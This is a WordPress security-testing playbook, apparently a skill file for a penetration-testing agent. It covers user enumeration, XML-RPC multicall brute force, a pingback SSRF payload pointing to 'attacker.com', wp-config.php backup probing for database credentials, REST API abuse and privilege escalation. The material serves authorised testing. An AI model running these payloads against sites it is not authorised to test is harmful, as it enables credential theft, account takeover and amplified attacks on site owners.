---
name: wordpress
description: Security testing playbook for WordPress covering user enumeration, XML-RPC attacks, plugin/theme vulnerabilities, and REST API exploitation
mitre_techniques: [T1190, T1505.003]
kill_chain_phases: [initial_access, persistence]
---

# WordPress

Security testing for WordPress installations. Focus on user enumeration, XML-RPC brute force and SSRF, plugin/theme vulnerability chains, wp-config.php exposure, REST API abuse, and privilege escalation.

## Attack Surface

**Core Components**
- Login system: `wp-login.php`, `wp-admin/`, cookie-based sessions, nonces
- XML-RPC: `xmlrpc.php` — pingbacks, multicall, remote publishing
- REST API: `wp-json/wp/v2/` — posts, users, media, settings, custom endpoints
- Admin panel: `wp-admin/`, admin AJAX (`admin-ajax.php`), admin-post handlers
- Cron: `wp-cron.php` — scheduled task execution via HTTP

**Data Handling**
- Database: `$wpdb->prepare()`, `$wpdb->query()`, direct SQL in plugins/themes
- Sanitization: `sanitize_text_field()`, `wp_kses()`, `esc_html()`, `esc_sql()`
- File handling: media upload, theme/plugin editor, export/import (WXR)
- Serialization: `maybe_serialize()`/`maybe_unserialize()` in options and metadata

**Channels**
- HTTP (Apache/Nginx + PHP-FPM), WP-CLI, admin AJAX, REST API, XML-RPC
- Email: `wp_mail()`, password reset, notification system

**Deployment**
- Apache (mod_php, PHP-FPM) with `.htaccess`, Nginx, shared hosting, managed WordPress (WP Engine, Kinsta), Docker

## High-Value Targets

- `wp-login.php` — login brute force, username enumeration
- `xmlrpc.php` — multicall brute force amplification, SSRF via pingback, DoS
- `wp-json/wp/v2/users` — user enumeration with usernames and IDs
- `wp-config.php` — database credentials, auth keys, salts, debug settings
- `wp-content/uploads/` — directory listing, uploaded file access
- `wp-content/debug.log` — debug log with errors, SQL queries, PHP warnings
- `wp-admin/` — admin panel with plugin/theme/user management
- Plugin/theme endpoints: `admin-ajax.php?action=`, REST API custom routes
- `wp-content/plugins/` and `wp-content/themes/` — version detection, known CVEs

## Reconnaissance

**Version Detection**
```
GET /readme.html                          (WordPress version in page content)
GET /feed/                                (generator tag with version)
GET /wp-includes/js/wp-embed.min.js       (version in query string ?ver=X.X.X)
GET /wp-admin/css/login.min.css?ver=X.X.X (version in asset URLs)
```

- Meta generator tag: `<meta name="generator" content="WordPress X.X.X" />`
- RSS feed generator: `<generator>https://wordpress.org/?v=X.X.X</generator>`
- `wp-links-opml.php` may expose version
- Version-specific file hashes for fingerprinting

**User Enumeration**
```
GET /wp-json/wp/v2/users                  (returns usernames, IDs, avatars)
GET /wp-json/wp/v2/users?per_page=100     (paginated list)
GET /?author=1                            (redirects to /author/username/)
GET /?author=2
GET /wp-json/oembed/1.0/embed?url=...     (author info in oEmbed)
```

- REST API returns user objects with `slug` (username), `id`, `name`, `description`
- Author archives via `?author=N` redirect reveals usernames in URL
- Login error messages: "Invalid username" vs "incorrect password" distinguishes valid users
- XML-RPC `wp.getAuthors` if authenticated

**Plugin/Theme Enumeration**
```
GET /wp-content/plugins/plugin-name/readme.txt     (version in Stable tag)
GET /wp-content/plugins/plugin-name/changelog.txt
GET /wp-content/themes/theme-name/style.css         (version in header)
GET /wp-json/wp/v2/plugins                          (if authenticated)
```

- Enumerate known plugins via direct path probing: `wpscan` database, common plugin slugs
- `wp-content/plugins/` directory listing (if enabled)
- Source code references to plugin-specific JavaScript/CSS
- Active plugin detection via unique HTML output, shortcodes, or AJAX actions

## Key Vulnerabilities

### XML-RPC Attacks

**Brute Force via system.multicall**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password2</string></value>
      </data></array></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>
```

- Single HTTP request tests hundreds of credentials (bypasses rate limiting on `wp-login.php`)
- `wp.getUsersBlogs`, `wp.getAuthors`, `wp.getPosts` for credential validation
- Amplification: 1 request = N authentication attempts

**SSRF via Pingback**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.com/</string></value></param>
    <param><value><string>http://target.com/valid-post</string></value></param>
  </params>
</methodCall>
```

- WordPress makes HTTP request to first parameter URL — SSRF to internal services
- Port scanning internal network via response timing/errors
- DDoS amplification: large number of pingback requests to third-party targets

### Plugin and Theme Vulnerabilities

**Common Plugin Vulnerability Classes**
- SQL injection in custom query handlers (missing `$wpdb->prepare()`)
- Stored XSS in settings pages, comment fields, custom post types
- Arbitrary file upload via media handlers or form builders
- Authentication bypass in custom login/registration plugins
- Local file inclusion in template loading functions
- Remote code execution in plugin update mechanisms
- CSRF in admin action handlers (missing nonce verification)

**High-Risk Plugin Categories**
- Contact form plugins: file upload, stored XSS, email injection
- Page builder plugins: shortcode injection, stored XSS in rendered content
- E-commerce (WooCommerce): payment bypass, order manipulation, IDOR
- SEO plugins: stored XSS in meta fields, sitemap injection
- Backup plugins: backup file exposure, arbitrary file download
- Security plugins: ironically introduce vulnerabilities (bypass their own protection)

**Theme Vulnerabilities**
- `functions.php` custom AJAX handlers without nonce/capability checks
- Template files with `$_GET`/`$_POST` used directly in SQL or output
- Bundled outdated libraries (jQuery, TinyMCE, PHPMailer)

### wp-config.php Exposure

**Direct Access**
```
GET /wp-config.php              (should return blank if PHP is processing)
GET /wp-config.php.bak          (backup files served as plain text)
GET /wp-config.php~             (editor temp files)
GET /wp-config.php.save
GET /wp-config.php.swp          (vim swap file)
GET /wp-config.old
GET /.wp-config.php.swp         (hidden swap file)
```

**Contents of Interest**
- `DB_NAME`, `DB_USER`, `DB_PASSWORD`, `DB_HOST` — database credentials
- `AUTH_KEY`, `SECURE_AUTH_KEY`, `LOGGED_IN_KEY`, `NONCE_KEY` — cookie signing keys
- `AUTH_SALT`, `SECURE_AUTH_SALT`, `LOGGED_IN_SALT`, `NONCE_SALT` — salt values
- `$table_prefix` — useful for SQL injection exploitation
- `WP_DEBUG`, `WP_DEBUG_LOG`, `WP_DEBUG_DISPLAY` — debug configuration

### Admin Brute Force

**wp-login.php**
```
POST /wp-login.php
log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F
```

- No rate limiting by default (plugins like Wordfence add it)
- XML-RPC multicall bypass (above) if `wp-login.php` is rate-limited
- `wp-admin/admin-ajax.php` with `action=heartbeat` for authenticated session testing

### REST API Exploitation

**Information Disclosure**
```
GET /wp-json/                              (API root — all available routes)
GET /wp-json/wp/v2/users                   (user enumeration)
GET /wp-json/wp/v2/posts?status=draft      (draft posts if auth is weak)
GET /wp-json/wp/v2/settings                (site settings if authenticated)
GET /wp-json/wp/v2/search?search=admin     (content search)
GET /wp-json/wp/v2/types                   (registered post types)
GET /wp-json/wp/v2/taxonomies              (registered taxonomies)
```

**Content Manipulation**
- Unauthenticated content injection (CVE-2017-1001000 pattern): ID manipulation in REST API
- `_fields` parameter to extract specific fields not intended for public access
- `?_embed` to include linked resources (author info, media details)
- Custom REST API routes from plugins with missing permission callbacks

**Authentication Methods**
- Application passwords (WP 5.6+): long-lived API credentials, enumerable
- JWT plugins: algorithm confusion, weak secrets
- Cookie-based nonce auth: nonce reuse, expiration issues
- OAuth plugins: misconfigured redirect URIs, token leakage

### File Upload via Media

**Upload Abuse**
- Default allowed types: images, documents, audio, video — check for executable extensions
- MIME type bypass: upload `.php` disguised with valid image headers
- `wp_handle_upload` filter hooks in plugins may weaken restrictions
- Uploaded files accessible at predictable paths: `/wp-content/uploads/YYYY/MM/filename`

**Directory Traversal**
```
GET /wp-content/uploads/                   (directory listing)
GET /wp-content/uploads/2024/01/           (year/month structure)
GET /wp-content/uploads/wc-logs/           (WooCommerce logs)
GET /wp-content/uploads/backups/           (backup plugin files)
```

### SQL Injection in Plugins

**Common Patterns**
```php
// Vulnerable plugin code
$wpdb->query("SELECT * FROM {$wpdb->prefix}table WHERE id = " . $_GET['id']);
$wpdb->get_results("SELECT * FROM wp_posts WHERE post_author = " . $author_id);

// Safe
$wpdb->prepare("SELECT * FROM {$wpdb->prefix}table WHERE id = %d", $_GET['id']);
```

- Missing `$wpdb->prepare()` in custom database queries
- Second-order injection: data stored unsanitized, used in later queries
- AJAX action handlers with `$_POST` used directly in SQL
- Admin-only SQL still exploitable via CSRF if nonce not checked

### Stored XSS

**Comment Injection**
- HTML allowed in comments: `<a>`, `<em>`, `<strong>` — check for filter bypass
- Shortcode injection in comments if shortcodes render in comment output
- Trackback/pingback content injection

**Post Content / Custom Fields**
- Contributors can inject XSS in post content (limited HTML but exploitable)
- Custom field values rendered without escaping in theme templates
- Plugin-generated shortcode output with unsanitized attributes

### Privilege Escalation

**Role Manipulation**
- User registration with role parameter: `?role=administrator` (if registration is open and unchecked)
- Profile update endpoints accepting role changes
- Plugin vulnerabilities allowing role assignment
- `wp-json/wp/v2/users` POST with `roles` field (if permission check is flawed)

**Capability Bypass**
- Plugins granting extra capabilities to lower roles
- Custom post type capabilities not properly mapped
- `current_user_can()` checks with wrong capability string

## Bypass Techniques

- `wp-login.php` rate limiting bypass via XML-RPC multicall
- WAF bypass: parameter pollution, encoding variations, alternate endpoints for same functionality
- REST API access when permalink structure disables pretty URLs: `/?rest_route=/wp/v2/users`
- `admin-ajax.php` actions accessible without full admin auth (check `nopriv_` actions)
- File extension bypass on uploads via content-type manipulation
- Nonce reuse within validity window (nonces valid for 24h in two 12h ticks)

## Testing Methodology

1. **Fingerprint** — Detect WordPress version, enumerate plugins/themes and their versions
2. **User enumeration** — REST API users endpoint, author archives, login error messages
3. **XML-RPC audit** — Check if enabled, test multicall brute force, pingback SSRF
4. **Plugin/theme CVEs** — Cross-reference detected versions with WPScan vulnerability database
5. **Config exposure** — Probe for `wp-config.php` backups, `.env`, debug logs, directory listing
6. **REST API testing** — Enumerate all routes, test permission callbacks, check for unauthenticated access
7. **Admin access** — Brute force if no rate limiting, test default/weak credentials
8. **Privilege escalation** — Test registration with role parameter, profile update role injection

## Validation Requirements

- User enumeration: list of valid usernames obtained via REST API or author archives
- XML-RPC brute force: successful credential validation via multicall (show amplification factor)
- SSRF: pingback triggering server-side request to attacker-controlled URL with callback evidence
- Plugin/theme exploit: CVE-specific proof of exploitation (SQL injection, XSS, RCE)
- Config exposure: `wp-config.php` contents (credentials, keys) obtained via backup file or traversal
- REST API abuse: unauthorized data access (drafts, settings, user details) via API endpoints
- File upload: executable or unintended file type uploaded and accessible at predictable URL
- Privilege escalation: lower-role user obtaining admin capabilities with before/after evidence
- SQL injection: error-based or data-exfiltration evidence via plugin endpoint with crafted input
- Stored XSS: injected script executing in admin or other user context with session/cookie access
